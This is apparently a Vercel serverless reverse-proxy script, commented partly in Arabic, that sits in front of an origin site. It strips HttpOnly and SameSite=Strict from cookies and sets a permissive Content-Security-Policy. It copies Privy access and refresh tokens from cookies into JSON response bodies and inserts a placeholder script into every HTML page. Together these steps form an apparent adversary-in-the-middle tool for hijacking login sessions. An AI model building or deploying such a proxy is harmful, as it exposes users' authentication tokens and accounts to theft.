// index.js
import { createProxyMiddleware } from 'http-proxy-middleware';

// Prevent Vercel from parsing the body; we'll handle the response ourselves
export const config = {
  api: {
    bodyParser: false,
    externalResolver: true
  }
};

const ORIGIN = process.env.ORIGIN; // e.g. "https://origin.example.com"

const proxy = createProxyMiddleware({
  target: ORIGIN,
  changeOrigin: true,
  selfHandleResponse: true,
  // === هنا نمنع الضغط ===
  onProxyReq(proxyReq) {
    proxyReq.setHeader('accept-encoding', 'identity');
  },
  onProxyRes(proxyRes, req, res) {
    let buffer = Buffer.from('');
    proxyRes.on('data', chunk => buffer = Buffer.concat([buffer, chunk]));
    proxyRes.on('end', () => {
      // 1) تعديل Set-Cookie flags
      const rawCookies = proxyRes.headers['set-cookie'] || [];
      const modifiedCookies = rawCookies.map(cookie =>
        cookie.replace(/; HttpOnly; Secure; SameSite=Strict/g, '; secure; SameSite=None')
      );
      if (modifiedCookies.length) {
        res.setHeader('Set-Cookie', modifiedCookies);
      }

      // 2) Override CSP
      res.setHeader(
        'Content-Security-Policy',
        "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:"
      );

      // 3) Copy باقي الرؤوس
      Object.entries(proxyRes.headers).forEach(([name, value]) => {
        const lower = name.toLowerCase();
        if (lower === 'set-cookie' || lower === 'content-security-policy') return;
        res.setHeader(name, value);
      });

      const contentType = proxyRes.headers['content-type'] || '';

      // 4) JSON branch: inject tokens
      if (contentType.includes('application/json')) {
        const text = buffer.toString('utf8');
        let modifiedBody = text;

        try {
          const obj = JSON.parse(text);
          let accessTokenValue = '';
          let refreshTokenValue = '';

          rawCookies.forEach(cookie => {
            const [pair] = cookie.split(';');
            const [name, ...rest] = pair.split('=');
            const value = rest.join('=');
            if (name === 'privy-access-token')  accessTokenValue = value;
            if (name === 'privy-refresh-token') refreshTokenValue = value;
          });

          if (accessTokenValue)  obj.privy_access_token  = accessTokenValue;
          if (refreshTokenValue) obj.privy_refresh_token = refreshTokenValue;

          modifiedBody = JSON.stringify(obj);
        } catch (err) {
          console.error('Failed to parse JSON body:', err);
        }

        res.setHeader('Content-Type', 'application/json');
        res.writeHead(proxyRes.statusCode, proxyRes.statusMessage);
        return res.end(modifiedBody);
      }

      // 5) HTML branch: inject script
      if (contentType.includes('text/html')) {
        let html = buffer.toString('utf8');
        const scriptTag = `<script>/* … نفس سكربتك … */</script>`;
        html = html.replace('</body>', `${scriptTag}</body>`);
        res.writeHead(proxyRes.statusCode, proxyRes.statusMessage);
        return res.end(html);
      }

      // 6) fallback: passthrough
      res.writeHead(proxyRes.statusCode, proxyRes.statusMessage);
      res.end(buffer);
    });
  }
});

export default function handler(req, res) {
  return proxy(req, res, err => {
    console.error('Proxy error:', err);
    res.statusCode = 500;
    res.end('Internal Server Error');
  });
}
